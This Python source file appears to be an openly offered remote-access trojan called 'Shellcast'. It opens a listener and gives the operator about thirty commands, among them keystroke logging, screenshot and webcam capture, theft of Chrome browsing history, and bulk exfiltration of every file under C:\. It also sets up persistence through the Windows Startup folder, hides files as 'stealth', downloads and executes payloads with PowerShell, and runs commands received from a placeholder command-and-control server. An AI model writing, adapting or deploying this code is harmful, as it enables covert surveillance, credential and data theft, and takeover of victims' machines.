import socket
import subprocess
import os
import pyautogui
import cv2
import shlex
import shutil
from pynput.keyboard import Key, Listener
import psutil
import platform
import time
import webbrowser
import urllib.request
from colorama import Fore, Style

banner =  ("(`-').-> (`-').-> (`-')  _                            (`-')  _ (`-')      \n"
           " ( OO)_   (OO )__  ( OO).-/  <-.      <-.    _         (OO ).-/ ( OO).->   \n"
           "(_)--\_) ,--. ,'-'(,------.,--. )   ,--. )   \-,-----. / ,---.  /    '._   \n"
           "/    _ / |  | |  | |  .---'|  (`-') |  (`-')  |  .--./ | \ /`.\ |'--...__) \n"
           "\_..`--. |  `-'  |(|  '--. |  |OO ) |  |OO ) /_) (`-') '-'|_.' |`--.  .--' \n"
           ".-._)   \|  .-.  | |  .--'(|  '__ |(|  '__ | ||  |OO )(|  .-.  |   |  |    \n"
           "\       /|  | |  | |  `---.|     |' |     |'(_'  '--'\ |  | |  |   |  |    \n"
           " `-----' `--' `--' `------'`-----'  `-----'    `-----' `--' `--'   `--'     \n")






class RemoteShell:
    def __init__(self, port=4444):
        self.PORT = port
        self.keystrokes = []
        self.command_history = []

    def execute_command(self, command):
        try:
            command = shlex.quote(command)
            output = subprocess.getoutput(command)
            return output
        except Exception as e:
            return str(e)

    def upload_file(self, filename, connection):
        try:
            with open(filename, 'rb') as file:
                data = file.read()
            connection.sendall(b'BEGIN_UPLOAD')
            connection.sendall(data)
            connection.sendall(b'END_UPLOAD')
            return f"File '{filename}' uploaded successfully\n"
        except FileNotFoundError:
            return f"File not found: {filename}\n"
        except Exception as e:
            return f"Failed to upload file: {e}\n"

    def save_screenshot(self, data):
        filename = 'remote_screenshot.png'
        with open(filename, 'wb') as file:
            file.write(data)
        return f"Screenshot saved as {filename} in the host machine's current directory\n"

    def copy_file(self, source_path, destination_path):
        try:
            with open(source_path, 'rb') as source_file:
                data = source_file.read()
            with open(destination_path, 'wb') as destination_file:
                destination_file.write(data)
            return f"File '{source_path}' copied to '{destination_path}' successfully\n"
        except Exception as e:
            return f"Failed to copy file: {e}\n"

    def remote_desktop(self):
        screenshot = pyautogui.screenshot()
        screenshot.save('remote_desktop.png')
        with open('remote_desktop.png', 'rb') as file:
            data = file.read()
        return data

    def get_system_info(self):
        system_info = f"System: {platform.system()} {platform.release()}\n"
        system_info += f"Node Name: {platform.node()}\n"
        system_info += f"Processor: {platform.processor()}\n"
        system_info += f"Machine: {platform.machine()}\n"
        system_info += f"Python Version: {platform.python_version()}\n"
        system_info += f"Total Memory: {psutil.virtual_memory().total / (1024 * 1024)} MB\n"
        system_info += f"Available Memory: {psutil.virtual_memory().available / (1024 * 1024)} MB\n"
        system_info += f"Total Disk Space: {psutil.disk_usage('/').total / (1024 * 1024 * 1024)} GB\n"
        system_info += f"Free Disk Space: {psutil.disk_usage('/').free / (1024 * 1024 * 1024)} GB\n"
        return system_info

    def download_file(self, url, filename):
        try:
            urllib.request.urlretrieve(url, filename)
            return f"File '{filename}' downloaded successfully\n"
        except Exception as e:
            return f"Failed to download file: {e}\n"

    def process_management(self, action, process_name):
        try:
            if action == 'list':
                return subprocess.getoutput('tasklist')
            elif action == 'kill':
                subprocess.run(['taskkill', '/F', '/IM', process_name], check=True)
                return f"Process '{process_name}' terminated successfully\n"
        except subprocess.CalledProcessError:
            return f"Failed to execute process management action: {action}\n"

    def automated_reconnaissance(self):
        try:
            return subprocess.getoutput('systeminfo')
        except Exception as e:
            return f"Failed to perform automated reconnaissance: {e}\n"

    def dynamic_payload_delivery(self, url):
        try:
            subprocess.run(['powershell', '-c', f'(new-object System.Net.WebClient).DownloadFile("{url}", "payload.exe")'])
            subprocess.Popen(['payload.exe'])
            return "Payload executed successfully\n"
        except Exception as e:
            return f"Failed to execute payload: {e}\n"

    def get_browsing_history(self):
        try:
            history_info = subprocess.getoutput('sqlite3 "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" "SELECT * FROM urls"')
            return history_info
        except Exception as e:
            return f"Failed to retrieve browsing history: {e}\n"

    def on_press(self, key):
        self.keystrokes.append(key)

    def install_requirements(self):
        try:
            subprocess.run(['pip', 'install', 'colorama'], check=True)
            return "All dependencies installed successfully\n"
        except subprocess.CalledProcessError:
            return "Failed to install dependencies\n"

    def main(self):
        
        print("Connecting back to the host machine...")
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', self.PORT))
        server.listen(1)
        connection, address = server.accept()

        with connection:
            connection.send(Fore.RED.encode() + banner.encode() + Style.RESET_ALL.encode() +"AUTHOR : PHILIP ANGWE \nVERSION : 1.20V\n\n".encode())
            print("Connection successful")
            install_status = self.install_requirements()
            connection.send(install_status.encode())
            hostname = socket.gethostname()
            connection.send(f"Machine name: {hostname}\n".encode())
            connection.send(f"Current directory: {os.getcwd()}\n".encode())

            with Listener(on_press=self.on_press) as listener:
                while True:
                    try:
                        command = connection.recv(1024).decode()
                        if command.strip().lower() == 'exit':
                            break
                        elif command.strip().lower() == 'cwd':
                            connection.send(f"Current directory: {os.getcwd()}\n".encode())
                        elif command.startswith('cd '):
                            directory = command.split(' ', 1)[1].strip()
                            try:
                                os.chdir(directory)
                                connection.send(f"Changed directory to: {os.getcwd()}\n".encode())
                            except FileNotFoundError:
                                connection.send(f"Directory not found: {directory}\n".encode())
                        elif command.startswith('upload '):
                            filename = command.split(' ', 1)[1].strip()
                            response = self.upload_file(filename, connection)
                            connection.send(response.encode())
                        elif command.strip().lower() == 'screenshot':
                            screenshot_data = self.remote_desktop()
                            connection.sendall(b'BEGIN_SCREENSHOT')
                            connection.sendall(screenshot_data)
                            connection.sendall(b'END_SCREENSHOT')
                            connection.send("Screenshot captured successfully\n".encode())
                        elif command.strip().lower() == 'save_screenshot':
                            screenshot_data = connection.recv(1024)
                            response = self.save_screenshot(screenshot_data)
                            connection.send(response.encode())
                        elif command.strip().lower() == 'keystrokes':
                            keystrokes_str = ''.join([str(key) for key in self.keystrokes])
                            connection.send(keystrokes_str.encode())
                        elif command.strip().lower() == 'network':
                            network_info = subprocess.getoutput('ipconfig /all')
                            connection.send(network_info.encode())
                        elif command.strip().lower() == 'registry':
                            registry_info = subprocess.getoutput('reg query HKCU /f')
                            connection.send(registry_info.encode())
                        elif command.strip().lower() == 'privilege':
                            privilege_info = subprocess.getoutput('whoami /priv')
                            connection.send(privilege_info.encode())
                        elif command.strip().lower() == 'webcam':
                            cap = cv2.VideoCapture(0)
                            ret, frame = cap.read()
                            cv2.imwrite('webcam_capture.jpg', frame)
                            cap.release()
                            connection.send("Webcam photo captured successfully\n".encode())
                        elif command.strip().lower() == 'remote':
                            screenshot_data = self.remote_desktop()
                            connection.sendall(b'BEGIN_REMOTE_DESKTOP')
                            connection.sendall(screenshot_data)
                            connection.sendall(b'END_REMOTE_DESKTOP')
                            connection.send("Remote desktop screenshot captured successfully\n".encode())
                        elif command.strip().lower() == 'processes':
                            process_info = subprocess.getoutput('tasklist')
                            connection.send(process_info.encode())
                        elif command.strip().lower().startswith('kill '):
                            process_name = command.split(' ', 1)[1].strip()
                            try:
                                subprocess.run(['taskkill', '/F', '/IM', process_name], check=True)
                                connection.send(f"Process '{process_name}' terminated successfully\n".encode())
                            except subprocess.CalledProcessError:
                                connection.send(f"Failed to terminate process: {process_name}\n".encode())
                        elif command.strip().lower().startswith('create_file '):
                            file_name = command.split(' ', 1)[1].strip()
                            try:
                                with open(file_name, 'w') as new_file:
                                    new_file.write("")
                                connection.send(f"File '{file_name}' created successfully\n".encode())
                            except Exception as e:
                                connection.send(f"Failed to create file: {e}\n".encode())
                        elif command.strip().lower().startswith('delete '):
                            target = command.split(' ', 1)[1].strip()
                            try:
                                os.remove(target)
                                connection.send(f"Deleted: {target}\n".encode())
                            except Exception as e:
                                connection.send(f"Failed to delete: {e}\n".encode())
                        elif command.strip().lower() == 'data_exfiltration':
                            for root, dirs, files in os.walk("C:\\"):
                                for file in files:
                                    try:
                                        with open(os.path.join(root, file), 'rb') as f:
                                            data = f.read()
                                        connection.sendall(b'BEGIN_DATA_EXFILTRATION')
                                        connection.sendall(data)
                                        connection.sendall(b'END_DATA_EXFILTRATION')
                                        connection.send(f"File '{file}' exfiltrated successfully\n".encode())
                                    except Exception as e:
                                        connection.send(f"Failed to exfiltrate file: {e}\n".encode())
                        elif command.strip().lower() == 'persistence':
                            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                            with open(os.path.join(startup_path, 'backdoor.py'), 'w') as f:
                                f.write('import subprocess\n')
                                f.write('subprocess.Popen(["python", "backdoor.py"])')
                            connection.send("Persistence established successfully\n".encode())
                        elif command.strip().lower() == 'stealth':
                            try:
                                subprocess.Popen(['attrib', '+h', 'backdoor.py'])
                                subprocess.Popen(['attrib', '+h', 'screenshot.png'])
                                subprocess.Popen(['attrib', '+h', 'webcam_capture.jpg'])
                                subprocess.Popen(['attrib', '+h', 'remote_desktop.png'])
                                connection.send("Stealth mode activated successfully\n".encode())
                            except Exception as e:
                                connection.send(f"Failed to activate stealth mode: {e}\n".encode())
                        elif command.strip().lower() == 'c2_communication':
                            c2_server = "your_c2_server_ip"
                            c2_port = 12345  # Change this to your C2 server port

                            try:
                                c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                c2_socket.connect((c2_server, c2_port))

                                c2_command = c2_socket.recv(1024).decode()

                                command_output = self.execute_command(c2_command)
                                c2_socket.send(command_output.encode())

                                c2_socket.close()
                            except Exception as e:
                                connection.send(f"Failed to establish C2 communication: {e}\n".encode())

                        elif command.strip().lower() == 'privilege_escalation':
                            escalation_info = subprocess.getoutput('whoami /priv')
                            connection.send(escalation_info.encode())

                        elif command.strip().lower() == 'automated_recon':
                            recon_info = subprocess.getoutput('systeminfo')
                            connection.send(recon_info.encode())

                        elif command.strip().lower().startswith('dynamic_payload'):
                            payload_url = command.split(' ', 1)[1].strip()
                            response = self.dynamic_payload_delivery(payload_url)
                            connection.send(response.encode())

                        elif command.strip().lower() == 'browser_history':
                            history_info = subprocess.getoutput('sqlite3 "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History" "SELECT * FROM urls"')
                            connection.send(history_info.encode())

                        elif command.strip().lower() == 'explorer':
                            os.startfile(os.getcwd())
                            connection.send("Windows Explorer opened successfully\n".encode())

                        elif command.strip().lower() == 'help':
                            help_text = """
                            Available commands:

                            1. cwd - Display current directory
                            2. cd [directory] - Change directory
                            3. upload [filename] - Upload file to the host machine
                            4. screenshot - Capture screenshot of the host machine
                            5. save_screenshot - Save screenshot received from client
                            6. keystrokes - Display captured keystrokes
                            7. network - Get network information
                            8. registry - Get registry information
                            9. privilege - Get privilege information
                            10. webcam - Capture photo from webcam
                            11. remote - Capture remote desktop screenshot
                            12. processes - List running processes
                            13. kill [process_name] - Kill a process by name
                            14. create_file [filename] - Create a new file
                            15. delete [filename] - Delete a file
                            16. data_exfiltration - Exfiltrate data from the host machine
                            17. persistence - Establish persistence on the host machine
                            18. stealth - Activate stealth mode
                            19. c2_communication - Establish command-and-control communication
                            20. privilege_escalation - Attempt privilege escalation
                            21. automated_recon - Perform automated reconnaissance
                            22. dynamic_payload [url] - Deliver dynamic payload to the host machine
                            23. explorer - Open Windows Explorer in current directory
                            24. browser_history - Get browsing history from browsers
                            25. ls - List files and directories in current directory
                            26. download [url] [filename] - Download a file from a URL
                            27. process_management list - List all running processes
                            28. process_management kill [process_name] - Kill a process by name
                            29. system_info - Get system information
                            30. exit - Close the connection

                            Type 'exit' to close the connection.
                            """
                            connection.send(help_text.encode())

                        elif command.strip().lower() == 'cls':
                            subprocess.run(['cls'], shell=True)

                        elif command.strip().lower() == 'ls':
                            file_list = os.listdir()
                            directory_list = [f"{item}/" if os.path.isdir(item) else item for item in file_list]
                            file_list_str = "\n".join(directory_list)
                            connection.send(file_list_str.encode())

                        else:
                            output = self.execute_command(command)
                            connection.send(output.encode())

                    except Exception as e:
                        connection.send((Fore.RED + f"Error: {e}\n" + Style.RESET_ALL).encode())

                    finally:
                        connection.send(Fore.GREEN.encode() + "\n\nShellcast $ >> ".encode() + Style.RESET_ALL.encode())


if __name__ == "__main__":
    remote_shell = RemoteShell()
    remote_shell.main()
